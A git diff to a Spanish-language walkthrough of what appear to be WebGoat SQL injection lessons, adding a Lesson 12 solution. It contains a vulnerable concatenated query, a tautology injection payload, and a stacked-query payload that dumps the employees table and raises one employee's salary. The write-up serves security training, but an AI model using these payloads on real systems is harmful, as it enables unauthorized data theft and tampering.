@@ -147,7 +147,7 @@ Debemos obtener la lista de usuarios completa inyectando una sentencia SQL.
 
 Disponemos de dos inputs de texto, uno para `last_name` y otro para `auth_tan`.
 
-Nuestra sentencia SQL es la siguiente:
+La sentencia SQL es la siguiente:
 
 ```sql
 "SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "'";
@@ -162,3 +162,22 @@ De esta forma, la consulta SQL inyectada sería:
 ```sql
 SELECT * FROM employees WHERE last_name='Smith' AND auth_tan='3SL99A' or '1'='1'
 ```
+![alt text](imgs/sql0.png)
+
+## Lesson 12
+
+### Desarrollo
+
+Se nos pide actualizar el salario del empleado "John Smith" por encima del resto.
+
+### Solución
+
+Podemos encadenar varias sentencias SQL para lograr el objetivo. Para ello, debemos ingresar la siguiente consulta SQL:
+
+```sql
+3SL99A' or '1' = '1'; SELECT * from employees;UPDATE employees SET salary = 1000000 WHERE last_name = 'Smith';--
+```
+
+Debemos tener cuidado de no sobrepasar el valor máximo permitido para el campo `salary`.
+
+![alt text](imgs/sql1.png)
